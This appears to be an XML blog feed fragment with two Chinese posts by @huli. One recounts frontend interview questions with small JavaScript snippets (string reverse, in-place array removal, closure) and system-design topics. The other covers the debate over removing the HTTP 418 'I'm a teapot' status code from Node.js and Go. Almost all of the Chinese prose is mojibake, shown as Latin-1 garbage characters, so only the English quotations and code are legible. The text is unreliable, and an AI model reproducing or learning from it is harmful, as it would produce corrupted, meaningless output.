å‡è¨­ç¾åœ¨æœ‰å¾ˆå¤š url çš„è³‡æ–™ï¼Œæ¯ç­†ä¸€è¡Œï¼Œè«‹æ‰¾å‡ºé‡è¤‡æ¬¡æ•¸æœ€å¤šçš„å‰ k å€‹ï¼Œä¸¦è¬›ä¸€ä¸‹æ™‚é–“è¤‡é›œåº¦æ˜¯å¤šå°‘ï¼Ÿ
å…¶å¯¦å°±æ˜¯ä¸€å€‹ç´”ç²¹è€ƒè³‡æ–™çµæ§‹åŠ æ¼”ç®—æ³•çš„é¡Œç›®ï¼Œçœ‹ä½ è¦ç”¨å“ªäº›çµ„åˆä¾†è™•ç†é€™å€‹å•é¡Œã€‚ä½†å…‰æ˜¯çŸ¥é“é‚„ä¸å¤ ï¼Œä¹Ÿè¦èƒ½å¤ æŠŠæ™‚é–“è¤‡é›œåº¦ä¸€ä½µè¬›å‡ºä¾†æ‰è¡Œã€‚æˆ‘è¨˜å¾—æˆ‘æœ€å¾Œçµ¦å‡ºçš„è§£æ³•æ‡‰è©²æ˜¯ç¶­è­·ä¸€å€‹æœ‰ k å€‹å…ƒç´ çš„é™£åˆ—ï¼Œç„¶å¾Œç”¨ map ä¾†å­˜ url çš„å‡ºç¾æ¬¡æ•¸ï¼Œé‚Šè®€è³‡æ–™é‚Šæ›´æ–°å‡ºç¾æ¬¡æ•¸ï¼Œç„¶å¾Œä¹Ÿæ›´æ–°é‚£ k å€‹å…ƒç´ çš„é™£åˆ—ï¼Œæ‰¾åˆ°æœ€å¾Œå°±æ˜¯ç­”æ¡ˆäº†ã€‚ä½†é€™å€‹è§£æ³•æˆ‘çš„æ™‚é–“è¤‡é›œåº¦ä¹Ÿæ²’æœ‰å›ç­”å¾—å¾ˆå¥½ï¼Œæœ‰äº›åœ°æ–¹ä¸å¤ªæ¸…æ¥šæ™‚é–“è¤‡é›œåº¦æ˜¯å¤šå°‘ã€‚
å°é€™é¡å‹çš„é¡Œç›®æœ‰èˆˆè¶£çš„è©±ï¼Œå¯åƒè€ƒï¼šåé“æµ·é‡æ•°æ®å¤„ç†é¢è¯•é¢˜ä¸åä¸ªæ–¹æ³•å¤§æ€»ç»“ã€‚
å››é¢æœ€å¾Œä¸€é¢ä¾èˆŠæ˜¯å•äº†å¾ˆå¤šæŠ€è¡“ï¼Œé€™ä¸€è¼ªé¢è©¦è¢«å•çš„å•é¡Œæœ€å¤šï¼Œè€Œä¸”ä¹Ÿæœ‰é‡å°æˆ‘ä»¥å‰åšéçš„æ±è¥¿å»å•ã€‚æˆ‘è¦ºå¾—å»£åº¦è·Ÿæ·±åº¦éƒ½æœ‰é¡§åŠåˆ°ã€‚
ç¬¬ä¸€é¡Œå…ˆå°è©¦èº«æ‰‹ï¼Œå¯«ä¸€å€‹ reverse çš„ functionï¼Œåè½‰å­—ä¸²
function reverse(s) &#123;    var output = &quot;&quot;;    var len = s.length;    for(var i=len-1; i&gt;=0; i--)&#123;        output+=s[i];    &#125;    return output;&#125;

ç¬¬äºŒé¡Œå¯«ä¸€å€‹ functionï¼š
var main = [1,2,3,4,5,6];var sub = [3,5];removeSubArray(main, sub) -&gt; [1,2,4,6]

é€™ä¸€é¡Œæ¯”è¼ƒç‰¹åˆ¥çš„é»æ˜¯è¦ç›´æ¥æ”¹è®Šå‚³é€²ä¾†çš„ array è€Œä¸æ˜¯ return æ–°çš„
function removeSubArray(main, sub) &#123;   for(var i=0; i&lt;main.length; i++)&#123;       var temp = sub.indexOf(main[i]);              //remove       if(temp&gt;=0) &#123;           sub.splice(temp, 1);           main.splice(i, 1);           i--;       &#125;   &#125;&#125;

ç¬¬ä¸‰é¡Œå¯«ä¸€å€‹ copy çš„ functionï¼Œè¤‡è£½å‚³é€²ä¾†çš„ object
é€™ä¸€é¡Œé›–ç„¶çœ‹ä¼¼ç°¡å–®ä½†å…¶å¯¦é™·é˜±å¾ˆå¤šï¼Œä¾‹å¦‚èªªï¼šå¦‚æœç¢°åˆ°å¾ªç’°å¼•ç”¨çš„ case æ€éº¼è¾¦ï¼Ÿä¾‹å¦‚èªª
var a = &#123;  test: &#123;  &#125;&#125;;a.test = a;

æœ‰äº› library æä¾›çš„ deep clone å‡½å¼ï¼Œç¢°åˆ°é€™å€‹ case ä¸€æ¨£ä¹Ÿæœƒæ›æ‰ã€‚ä½†åœ¨é¢è©¦çš„æ™‚å€™é€™å€‹ case æˆ‘ä¾èˆŠè§£ä¸æ‰ï¼Œéœ€è¦å†èŠ±é»æ™‚é–“æƒ³æƒ³ã€‚
ç¬¬å››é¡Œå¯«ä¸€å€‹ closureï¼ˆä»€éº¼æ¨£å­çš„éƒ½å¯ä»¥ï¼‰  
é€™ä¸€é¡Œé‚„æ»¿ç°¡å–®çš„å•¦ï¼Œåªè¦ä½ çŸ¥é“ä»€éº¼æ˜¯ closure æ‡‰è©²éƒ½å¯«å¾—å‡ºä¾†ã€‚
var increment = function()&#123; var times = 0; return function()&#123;    return ++times; &#125;&#125;

ç¬¬äº”é¡Œå•æˆ‘ä¹‹å‰åšéçš„ Android ç†±æ›´æ–°æ€éº¼åšçš„ï¼Œå•å¾ˆå¤šæŠ€è¡“ç´°ç¯€ã€‚
ç¬¬å…­é¡Œå•æˆ‘ä¹‹å‰åšçš„æ¶ç´…åŒ…æ´»å‹•æ˜¯æ€éº¼è¨­è¨ˆçš„ï¼Ÿé€™é‚Šçš„å¯¦ä½œåœ¨æˆ‘ä¹‹å‰å¯«éçš„æ–‡ç« ï¼šè³‡æ–™åº«çš„å¥½å¤¥ä¼´ï¼šRedisè£¡é¢æœ‰æåˆ°éã€‚
é‚£å€‹æ´»å‹•çš„éœ€æ±‚æ˜¯ï¼š

ä¸­åˆ 12 é»é–‹æ”¾ä½¿ç”¨è€…é€²å…¥ç¶²ç«™ï¼Œä¸¦ä¸”å›ç­”ä¸€é¡Œå•é¡Œ
å›ç­”å®Œå¾Œæœƒçœ‹åˆ°è‡ªå·±çš„æ’åï¼ˆä¾ç­”é¡Œæ™‚é–“æ’åºï¼‰ï¼Œç…§åæ¬¡ç²å¾—çå“
åªæœ‰å‰ 300 åæœ‰çå“ï¼Œä¹‹å¾Œéƒ½æ²’æœ‰

è©•ä¼°éå¾Œæˆ‘æ±ºå®šå¼•å…¥ Redis ä¾†æ¸›è¼•è³‡æ–™åº«çš„è² æ“”ã€‚é¢è©¦å®˜å•çš„å•é¡Œæ˜¯ï¼šæœ‰æ²’æœ‰è¾¦æ³•å¯«æˆï¼š300 åä»¥å¾Œé€£ç­”é¡Œé é¢éƒ½çœ‹ä¸åˆ°ï¼Œç›´æ¥æ“‹åœ¨å¤–é¢ã€‚é€™é‚Šæˆ‘æƒ³å¾ˆä¹…ä¹‹å¾Œé‚„æ˜¯æ²’æœ‰æƒ³åˆ°ä¸€å€‹æ¯”è¼ƒå¥½çš„è§£æ³•ï¼Œå°±åªæƒ³åˆ°æŠŠ Database lock èµ·ä¾†ï¼Œä½†é€™æ¨£åˆæœƒé€ æˆå¾ˆå¤šæ€§èƒ½çš„æè€—ã€‚æœ€å¾Œæˆ‘æœ‰å•é¢è©¦å®˜é€™é¡Œæ‡‰è©²æ€éº¼è§£ï¼Œä»–èªªä»–ä¹Ÿé‚„æ²’æœ‰æƒ³æ³•ï¼Œåªæ˜¯å•å•çœ‹æœ‰æ²’æœ‰å¯èƒ½è€Œå·²XD
ç¬¬ä¸ƒé¡Œè¬›ä¸€ä¸‹ session è·Ÿ cookie çš„å·®åˆ¥ï¼Œé‚„æœ‰ session å­˜åœ¨å“ªè£¡ã€å¦‚æœæœ‰å…©å°æ©Ÿå™¨æ€éº¼ç®¡ç† sessionï¼Ÿ  
å‰›å¥½é€™ä¸€å¡Šæˆ‘ä¹‹å‰æœ‰å¼„æ‡‚éï¼Œæ‰€ä»¥å›ç­”çš„é‚„æ»¿å®Œæ•´çš„ã€‚åœ¨ä¹‹å‰å…¬å¸ä¹Ÿæœ‰ç¢°éå…©å°æ©Ÿå™¨è¦å…±ç”¨ session çš„æƒ…æ³ï¼Œæˆ‘å…ˆçµ¦äº†ä»–ä¸€å€‹ AWS EC2 ä¸Šé¢çš„ sticky session çš„è§£æ³•ï¼Œä»–ä¸å¤ªæ»¿æ„ã€‚å†ä¾†çµ¦äº†ç”¨ Redis çµ±ä¸€å„²å­˜ cache å†æ­é… Redis Replication ä¾†åš HA çš„è§£æ³•ï¼Œä»–å°±å¾ˆæ»¿æ„çš„èªªï¼šã€Œå—¯ï¼Œé€™æ¨£å¯ä»¥ã€
ç¬¬å…«é¡Œå•è³‡æ–™åº«çš„indexçš„æ¦‚å¿µï¼Œç‚ºä»€éº¼è¦æœ‰ indexï¼Ÿindex æ‡‰è©²æ€éº¼å»ºï¼Ÿ
å› ç‚ºè³‡æ–™åº«è·Ÿå¾Œç«¯é‚£é‚Šæˆ‘æ²’æœ‰å¾ˆç†Ÿï¼Œæ‰€ä»¥é€™é¡Œä¹Ÿæ˜¯å›ç­”å¾—äº‚ä¸ƒå…«ç³Ÿçš„ã€‚
çµè«–å…¶å¯¦é€™æ¨£å››æ¬¡é¢è©¦ä¸‹ä¾†ï¼Œæ¯ä¸€æ¬¡éƒ½å•æŠ€è¡“ä¹Ÿæ˜¯é‚„æ»¿ç´¯çš„ï¼Œä½†æ¯æ¬¡é¢è©¦ä¹Ÿéƒ½æ˜¯å¯ä»¥æª¢é©—è‡ªå·±æŠ€è¡“èƒ½åŠ›çš„å¥½æ™‚åˆ»ã€‚ä½ æœƒè¶Šé¢è©¦è¶ŠçŸ¥é“è‡ªå·±å“ªä¸€å€‹éƒ¨åˆ†ä¸è¶³ï¼Œä¾‹å¦‚èªªæˆ‘å°±æ˜¯å°æ–¼è³‡å·¥æœ¬ç§‘ç³»çš„é‚£äº›å¿…ä¿®æ¯”è¼ƒä¸ç†Ÿï¼Œæ‰€ä»¥ä¹‹å¾Œå°±æ‡‰è©²å¾€é€™å€‹æ–¹å‘åŠ å¼·ã€‚
é‚„æœ‰ï¼Œå¾ˆå¤šæ™‚å€™æˆ‘éƒ½å–œæ­¡è‡ªå·±é»˜é»˜æ€è€ƒï¼Œæ€è€ƒå‡ºä¸€å€‹è‡ªå·±è¦ºå¾—å¯è¡Œçš„è§£æ³•ä»¥å¾Œæ‰è·Ÿé¢è©¦å®˜è¬›ã€‚å¯æ˜¯æˆ‘å¾Œä¾†ç™¼ç¾é€™æ¨£åšä¸å¤ªå¥½ï¼Œå› ç‚ºä½ ä¸èªªè©±ï¼Œä»–ä¹Ÿä¸èªªè©±ï¼Œæ•´å€‹é¢è©¦éç¨‹å°±æœƒæœ‰å¾ˆå¤šç©ºç™½ï¼Œå…©å€‹éƒ½ä¸è¬›è©±ã€‚æ‰€ä»¥å¯ä»¥çš„è©±ï¼Œæ‡‰è©²è¦é‚Šæƒ³é‚Šè¬›è©±æˆ‘èªç‚ºæ˜¯æ¯”è¼ƒå¥½çš„ã€‚ä¾‹å¦‚èªªï¼šã€Œæˆ‘å‰›å‰›æå‡ºçš„è§£æ³•æ˜¯ O(n^2)ï¼Œæˆ‘ç¾åœ¨åœ¨æƒ³èªªæœ‰æ²’æœ‰å¯èƒ½æŠŠè¤‡é›œåº¦å£“åˆ° O(n log n)ï¼Œæˆ‘ç›®å‰çš„æ–¹å‘å¤§æ¦‚æ˜¯æœâ€¦å»æ€è€ƒã€
å„˜ç®¡æœ€å¾Œæ²’æœ‰ç­”å‡ºä¾†ï¼Œæœ‰æŠŠæƒ³æ³•è¬›å‡ºä¾†ï¼Œç¸½æ¯”åªçµ¦ä¸€å¥ï¼šã€Œæˆ‘ä¸çŸ¥é“ã€ä¾†å¾—å¥½ã€‚
é¢è©¦çš„æ™‚å€™ï¼Œå…¶å¯¦æˆ‘ä¹Ÿéƒ½æ˜¯æŠ±è‘—ä¸€ç¨®å­¸ç¿’çš„å¿ƒæ…‹ã€‚å› ç‚ºçŸ¥é“è‡ªå·±çš„å¯¦åŠ›çœŸçš„ä¸å¼·ï¼Œæ‰€ä»¥ä¹Ÿå¸Œæœ›èƒ½å¾é¢è©¦å®˜é‚£é‚Šå¾—åˆ°ä¸€äº›å»ºè­°ã€‚å¾ˆå¤šé¡Œç›®æˆ‘åœ¨ç­”ä¸å‡ºä¾†ä¹‹å¾Œéƒ½æœƒå•ä»–å€‘èªªèƒ½ä¸èƒ½æä¾›ä¸€äº›æ–¹å‘ï¼Œå› ç‚ºæˆ‘çœŸçš„å¾ˆæƒ³çŸ¥é“ç­”æ¡ˆï¼ˆä¸éæœ‰äº›ä¸ä¸€å®šæœƒçµ¦å°±æ˜¯äº†ï¼‰ã€‚
å¤§è‡´ä¸Šå°±æ˜¯é€™æ¨£å›‰ï¼Œå¸Œæœ›é€™ç¯‡å¿ƒå¾—å°å¤§å®¶ä¹‹å¾Œçš„é¢è©¦æœ‰å¹«åŠ©ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>frontend</tag>
        <tag>interview</tag>
        <tag>job</tag>
        <tag>resume</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¶æ•‘èŒ¶å£ºå¤§ä½œæˆ°ï¼š418 I am a teapot</title>
    <url>/2019/06/15/iam-a-teapot-418/</url>
    <content><![CDATA[å‰è¨€æœ‰è¨±å¤šçš„ HTTP Status Code å¤§å®¶éƒ½è€³ç†Ÿèƒ½è©³ï¼Œä¾‹å¦‚èªª 404 Not Foundã€500 Internal Server Error ä»¥åŠ 200 OK ç­‰ç­‰ã€‚
åœ¨çœ¾å¤šçš„ç‹€æ…‹ç¢¼ä¹‹ä¸­ï¼Œæœ‰ä¸€å€‹æ“ºæ˜å°±æ˜¯ä¾†æç¬‘çš„ï¼š418 Iâ€™m a teapotã€‚
ä½†ä½ çŸ¥é“å—ï¼Œå®ƒä¸åœ¨ HTTP æ¨™æº–è£¡é¢ï¼Œæ‰€ä»¥æ ¹æœ¬ä¸æ˜¯æ¨™æº–çš„ HTTP ç‹€æ…‹ç¢¼ã€‚ä½ å¯èƒ½æœƒæƒ³èªªï¼šã€Œæˆ‘éƒ½çœ‹é RFC äº†ï¼Œæ€éº¼æœƒä¸æ˜¯ï¼Ÿã€ã€‚ä½†é‚£ä»½ RFC ä¹Ÿè·Ÿ HTTP ä¸€é»é—œä¿‚éƒ½æ²’æœ‰ï¼Œä¸éæ»¿å¤šäººéƒ½æ²’æ³¨æ„åˆ°é€™é»ã€‚
æˆ‘ä¸€é–‹å§‹ä¹Ÿæ²’æ³¨æ„åˆ°é€™ä»¶äº‹ï¼Œä»¥ç‚º 418 æ˜¯ HTTP æ¨™æº–çš„å…¶ä¸­ä¸€éƒ¨åˆ†ï¼Œä¸€ç›´åˆ° 2017 å¹´ 8 æœˆæ™‚æœ‰äººåœ¨ Node.js çš„ GitHub ç™¼äº†ä¸€å€‹ Issueï¼š418 Iâ€™m A Teapot æˆ‘æ‰æ³¨æ„åˆ°ã€‚
Issue è£¡é¢æåˆ°å¸Œæœ›èƒ½ç§»é™¤å° 418 çš„ supportï¼Œè€Œç™¼èµ· Issue çš„ä½œè€…åœ¨è¢«äººå‘ŠçŸ¥ Go ä¹Ÿé€™æ¨£æçš„æ™‚å€™ï¼Œä¹Ÿè·‘å» Go ç™¼äº†ä¸€å€‹ Issueã€‚
é‚£æ™‚å€™é€™èµ·è¦æ±‚ç§»é™¤ 418 ç‹€æ…‹ç¢¼çš„äº‹ä»¶å…¶å¯¦å¼•ç™¼äº†ä¸å°çš„é¢¨æ³¢ï¼Œè€Œå¤§éƒ¨åˆ†äººå…¶å¯¦æ˜¯åå°ç§»é™¤é€™å€‹ç‹€æ…‹ç¢¼çš„ã€‚ç”šè‡³é‚„æœ‰äººåšäº†ä¸€å€‹ save418.comï¼Œæƒ³è¦æ‹¯æ•‘ 418ã€‚
å‰é™£å­èŠ±äº†é»æ™‚é–“ç ”ç©¶ä¸€ä¸‹æ•´ä»¶äº‹æƒ…çš„ä¾†é¾å»è„ˆï¼Œåœ¨æ•´ç†çš„éç¨‹ä¸­ä¹Ÿç™¼ç¾ç„¡è«–è´Šæˆæˆ–æ˜¯åå°ï¼Œé€™å…¶ä¸­çš„ç†ç”±éƒ½å¾ˆå€¼å¾—æˆ‘å€‘å»æ€è€ƒï¼Œå› æ­¤åœ¨æ­¤ç¸½çµæˆä¸€ç¯‡æ–‡ç« è·Ÿå¤§å®¶åˆ†äº«ã€‚
418 çš„ç”±ä¾†418 çš„ç”±ä¾†å¯ä»¥è¿½æº¯åˆ° 1998 å¹´ 4 æœˆ 1 æ—¥æ„šäººç¯€çš„é€™ä¸€ä»½æ–‡ä»¶ï¼šRFC2324, Hyper Text Coffee Pot Control Protocol (HTCPCP&#x2F;1.0)ï¼ŒHTCPCP æ˜¯ Hyper Text Coffee Pot Control Protocol çš„ç°¡ç¨±ï¼Œç¸½ä¹‹é€™ä»½ RFC æè¿°äº†ä¸€å€‹å«åš HTCPCP çš„å”å®šï¼Œå»ºç«‹åœ¨ HTTP ä¹‹ä¸Šï¼Œä¸¦ä¸”å¯ä»¥åˆ©ç”¨é€™å€‹å”å®šä¾†æ³¡å’–å•¡ã€‚
è¬›åˆ° 418 çš„éƒ¨åˆ†åœ¨ Section 2.3.2ï¼š

2.3.2 418 Iâ€™m a teapot


  Any attempt to brew coffee with a teapot should result in the error   code â€œ418 Iâ€™m a teapotâ€. The resulting entity body MAY be short and   stout.

å¤§æ„å°±æ˜¯å¦‚æœæœ‰äººæƒ³ç”¨èŒ¶å£ºä¾†æ³¡å’–å•¡ï¼Œä½ æ‡‰è©²å›å€‹å®ƒä¸€å€‹ 418 çš„ç‹€æ…‹ç¢¼ï¼Œæˆ‘æ˜¯å€‹èŒ¶å£ºï¼Œä½ å¹¹å˜›æ‹¿æˆ‘ä¾†æ³¡å’–å•¡ï¼Ÿ
é€™é‚Šå€¼å¾—æ³¨æ„çš„åªæœ‰ä¸€ä»¶äº‹ï¼Œé‚£å°±æ˜¯ 418 æ˜¯åœ¨ HTCPCP é€™å€‹å”å®šè£¡é¢ï¼Œä¸¦ä¸æ˜¯ HTTPã€‚æ‰€ä»¥ 418 ä¸¦ä¸æ˜¯ HTTP å”å®šçš„æ¨™æº–ç‹€æ…‹ç¢¼ã€‚
ç§»é™¤ 418 çš„é¢¨æ³¢åœ¨ 2017 å¹´ 8 æœˆ 5 æ—¥ï¼ŒMark Nottingham åœ¨ Node.js çš„ GitHub ç™¼äº†é€™æ¨£çš„ä¸€å€‹ Issueï¼š

Node implements the 418 Iâ€™m a Teapot status code in a few places.


Its source is RFC2324, Hyper Text Coffee Pot Control Protocol (HTCPCP&#x2F;1.0). Note the title - HTCPCP&#x2F;1.0 is not HTTP&#x2F;1.x.


HTCPCP was an April 1 joke by Larry to illustrate how people were abusing HTTP in various ways. Ironically, itâ€™s not being used to abuse HTTP itself â€“ people are implementing parts of HTCPCP in their HTTP stacks.


In particular, Nodeâ€™s support for the HTCPCP 418 Iâ€™m a Teapot status code has been used as an argument in the HTTP Working Group to preclude use of 418 in HTTP for real-world purposes.


While we have a number of spare 4xx HTTP status codes that are unregistered now, the semantics of HTTP are something that (hopefully) are going to last for a long time, so one day we may need this code point.


Please consider removing support for 418 from Node, since itâ€™s not a HTTP status code (even by its own definition). I know itâ€™s amusing, I know that a few people have knocked up implementations for fun, but it shouldnâ€™t pollute the core protocol; folks can extend Node easily enough if they want to play with non-standard semantics.


Thanks,

è£¡é¢è«‹æ±‚ Node æŠŠ 418 çš„æ”¯æ´ç§»é™¤ï¼Œç†ç”±æ˜¯ 418 ä¸¦ä¸æ˜¯ HTTP æ¨™æº–çš„ç‹€æ…‹ç¢¼ï¼Œè€Œä¸” 4xx çš„ç‹€æ…‹ç¢¼é›–ç„¶é‚„æœ‰å¾ˆå¤šï¼Œä½†è‹¥æ˜¯æˆ‘å€‘å¸Œæœ› HTTP èƒ½ç›¡é‡æ´»å¾—é•·ä¹…ï¼Œæˆ‘å€‘çµ‚ç©¶æœ‰ä¸€å¤©éœ€è¦ç”¨åˆ°é€™å€‹ç‹€æ…‹ç¢¼çš„ã€‚
åº•ä¸‹å¼•èµ·äº†ä¸€ç•ªè¨è«–ä¹‹å¾Œï¼Œæœ‰äººæŒ‡å‡º Go ä¹Ÿå¯¦ä½œäº† 418ï¼Œå› æ­¤ Mark Nottingham å°±è·‘åˆ°äº† Go çš„ GitHub å»ï¼Œä¹Ÿç™¼äº†ä¸€å€‹ç›¸ä¼¼çš„ Issueï¼šnet&#x2F;http: remove support for status code 418 Iâ€™m a Teapotã€‚
é€™å…©å€‹ Issue å…¶å¯¦éƒ½å¾ˆå€¼å¾—ä¸€çœ‹ï¼Œè£¡é¢æœ‰è¨±å¤šå¾ˆæœ‰å»ºè¨­æ€§çš„è¨è«–ã€‚ä¸‹é¢æˆ‘æ•´ç†å¹¾å€‹æ”¯æŒèˆ‡åå°çš„è«–é»ã€‚
åå°ç§»é™¤ï¼š418 æ˜¯ç„¡å®³çš„
418 æ˜¯å€‹ç„¡å®³çš„å½©è›‹ï¼Œè€Œä¸”å¾ˆæœ‰è¶£ï¼Œé›¢æˆ‘å®¶çš„ 418 é ä¸€é»ï¼

æˆ‘è¦ºå¾—é€™è«–é»æ»¿ç„¡åŠ›çš„ï¼Œåªè¦è­‰æ˜ 418 å…¶å¯¦æ˜¯æœ‰å®³çš„å°±å¥½ã€‚
æ”¯æŒç§»é™¤ï¼šè¬ä¸€ä»¥å¾Œæœ‰äººè¦ç”¨ 418 æ€éº¼è¾¦ï¼Ÿ
ä½ èªª 418 ç„¡å®³ï¼Œä¸å°å•Šï¼Œå¦‚æœæˆ‘å€‘å¸Œæœ› HTTP èƒ½æ´»å¾—ä¹…ï¼Œé‚£é²æ—©æœƒæœ‰ 418 æœƒéœ€è¦è¢«ç”¨åˆ°çš„ä¸€å¤©ï¼Œåˆ°é‚£å¤©ä»–å°±æ˜¯åˆ¥çš„æ„æ€äº†ã€‚å°±ç®—ä½ æŠŠ 418 ä¿ç•™èµ·ä¾†ï¼Œä¹Ÿæ˜¯å°‘äº†ä¸€å€‹ç‹€æ…‹ç¢¼å¯ä»¥ç”¨

é€™ä¸€é»æˆ‘è¦ºå¾—æ»¿æœ‰è¶£çš„ã€‚çš„ç¢ºï¼Œç…§é€™ç¨®èªªæ³• 418 ä½”äº†ä¸€å€‹ä½ç½®ï¼Œä»¥å¾Œèƒ½ç”¨çš„ç‹€æ…‹ç¢¼å°±å°‘äº†ä¸€å€‹ã€‚ä½†å•é¡Œæ˜¯é€™ã€Œä¸€å€‹ã€é‡è¦å—ï¼Ÿå¯ä»¥æ­é…ä¸‹é¢çš„åå°è«–é»ä¸€èµ·çœ‹ã€‚
åå°ç§»é™¤ï¼š418 åªä½”äº†ä¸€å€‹ç©ºé–“ï¼Œå•é¡Œä¸åœ¨ 418å¦‚æœ 4xx éƒ½å¿«ç”¨å®Œçš„é‚£å¤©çœŸçš„ä¾†è‡¨äº†ï¼Œè©²æª¢è¨çš„æ˜¯ HTTP çš„è¨­è¨ˆï¼Œé‚„æ˜¯æª¢è¨ç‹€æ…‹ç¢¼ä¸å¤ ç”¨ï¼Ÿå¦‚æœçœŸçš„åªå‰©ä¸€å€‹å¯ä»¥ç”¨ï¼Œæ˜¯ä¸æ˜¯ä»£è¡¨é‚„æœ‰æ›´å¤§çš„å•é¡Œè©²è§£æ±ºï¼Ÿ
ä¹‹æ‰€ä»¥é€™é»æˆ‘è¦ºå¾—å¾ˆæœ‰è¶£ï¼Œæ˜¯å› ç‚ºé€™è·Ÿæˆ‘å€‘å¹³æ™‚åœ¨å¯«ç¨‹å¼æœƒç¢°åˆ°çš„å•é¡Œæ»¿åƒçš„ã€‚æœ‰æ™‚å€™ä½ æœƒæ“”å¿ƒè‡ªå·±æ˜¯ä¸æ˜¯éæ—©æœ€ä½³åŒ–ï¼ˆPremature Optimizationï¼‰æˆ–æ˜¯éåº¦å·¥ç¨‹åŒ–ï¼ˆOver Engineeringï¼‰ï¼Œåšäº†å®Œå…¨ä¸éœ€è¦ç”¨åˆ°çš„å„ªåŒ–ã€‚

å‡è¨­ä»Šå¤©æœ‰ä¸€å€‹ç¨‹å¼ï¼Œç”¨ 1~100 é€™ 100 å€‹æ•¸å­—ä¾†è¡¨ç¤ºä¸åŒç‹€æ…‹ã€‚éš¨è‘—æ™‚é–“æˆ‘å€‘æœƒéœ€è¦ä¸åŒçš„æ•¸å­—ä¾†è¡¨ç¤ºä¸åŒç‹€æ…‹ï¼Œæ‰€ä»¥èƒ½ç”¨çš„æ•¸å­—æœƒæ„ˆä¾†æ„ˆå°‘ï¼Œè€Œæˆ‘å€‘åˆå¸Œæœ›é€™ç¨‹å¼èƒ½å¤ æ´»å¾—é•·ä¹…ã€‚åœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼Œä½ è´Šæˆæˆ‘å€‘æ‹¿å…¶ä¸­ä¸€å€‹æ•¸å­—ä¾†ç•¶å½©è›‹å—ï¼Ÿ

å¦‚æœä½ åå°ï¼Œèªç‚ºæ¯ä¸€å€‹æ•¸å­—éƒ½å¾ˆé‡è¦ï¼Œä¸è©²éš¨æ„æ‹¿ä¸€å€‹æ•¸å­—å‡ºä¾†ç•¶å½©è›‹ï¼Œå°±ä»£è¡¨ä½ èªç‚º 418 æ˜¯è©²è¢«ç§»é™¤çš„ã€‚
ä½†æˆ‘è‡ªå·±å°é€™é¡Œçš„çœ‹æ³•æ˜¯ä¸€å€‹æ•¸å­—æ ¹æœ¬ç„¡é—œç·Šè¦ã€‚
ç†ç”±æ˜¯ï¼Œè‹¥æ˜¯ä½ çœŸçš„æŠŠ 99 å€‹æ•¸å­—ç”¨å®Œäº†ï¼Œå°±ç®—æˆ‘æ‹¿å»ç•¶å½©è›‹çš„æ•¸å­—é‚„ä½ ï¼Œä½ ä¾ç„¶åœ¨ä¸ä¹…å¾Œæœƒç”¨å®Œæ‰€æœ‰çš„æ•¸å­—ã€‚åˆ°é‚£å€‹æ™‚å€™ï¼Œä½ é‚„æ˜¯éœ€è¦æ‰¾æ–°çš„è§£æ³•ã€‚æ‰€ä»¥åªå·®ä¸€å€‹æ•¸å­—æ ¹æœ¬å·®ä¸äº†å¤šå°‘ã€‚
æ”¯æŒç§»é™¤ï¼š418 ä¸åœ¨ HTTP æ¨™æº–å…§é€™æ˜¯æˆ‘è¦ºå¾—æœ€æœ‰åŠ›çš„è«–é»ã€‚
å¤§å®¶éƒ½çŸ¥é“ 418 æ˜¯å€‹å½©è›‹ï¼Œä¹ŸçŸ¥é“å®ƒå¾ˆæœ‰è¶£ï¼Œå¯æ˜¯å®ƒçµ‚ç©¶ä¸æ˜¯ HTTP æ¨™æº–çš„ä¸€éƒ¨åˆ†ã€‚ä»Šå¤©ä½ å¦‚æœè¦å¯¦ä½œä¸€å€‹ã€Œéµå¾ª HTTP æ¨™æº–ã€çš„ç¨‹å¼ï¼Œä½ å°±ä¸æ‡‰è©²æŠŠ 418 æ”¾é€²å»ï¼Œå› ç‚ºå®ƒä¸åœ¨è£¡é¢ã€‚åœ¨ IANA è£¡é¢ 418 ä¹Ÿæ˜¯ Unassigned çš„ç‹€æ…‹ã€‚
å¦‚æœä½ ä»Šå¤©æ˜¯å¸‚äº•å°æ°‘ï¼Œæƒ³è¦åœ¨è‡ªå·±å®¶çš„ä¼ºæœå™¨æˆ–æ˜¯ App è£¡é¢å¯¦ä½œ 418ï¼Œé‚£æ²’æœ‰äººæœƒå¹²æ“¾ä½ ã€‚ä½†å°æ–¼ Node.jsã€Go é€™ç¨®å°ˆæ¡ˆä¾†èªªï¼Œå°±æ‡‰è©²éµå®ˆè¦ç¯„ä¾†é–‹ç™¼ã€‚
é€™é»ä¹Ÿå¯ä»¥å»¶ä¼¸åˆ°å¹³å¸¸é–‹ç™¼ç”¢å“æ™‚æœƒç¢°åˆ°çš„å•é¡Œã€‚å¦‚æœ PM è¦æ ¼å¯«ä¸æ¸…æ¥šï¼Œå·¥ç¨‹å¸«è¦å˜›è‡ªå·±é€šéˆï¼Œè¦å˜›å°±å« PM æŠŠæ¨¡ç³Šçš„åœ°æ–¹å¯«æ¸…æ¥šä¸€é»ï¼Œæœ€å¥½æ˜¯ä¸è¦æœ‰ä»»ä½•å€‹äººçš„è§£é‡‹ç©ºé–“ï¼Œè¶Šæ¸…æ¥šè¶Šå¥½ã€‚
ç•¶ä»Šå¤© PM æŠŠè¦æ ¼æ›¸å¯«å¾—è¶…ç´šæ¸…æ¥šï¼Œå·¥ç¨‹å¸«å»è‡ªå·±å·å·åŠ äº†ä¸€å€‹é¡å¤–çš„å½©è›‹ï¼Œé€™æ˜¯åˆç†çš„å—ï¼Ÿé€™å½©è›‹å¯èƒ½ç„¡é—œç·Šè¦ï¼Œå¯èƒ½åªæœ‰å·¥ç¨‹å¸«è‡ªå·±çŸ¥é“æ€éº¼æ‰“é–‹ï¼Œä½†ç„¡è«–å¦‚ä½•é‚„æ˜¯è¶…å‡ºäº†è¦æ ¼ä¹‹å¤–ã€‚
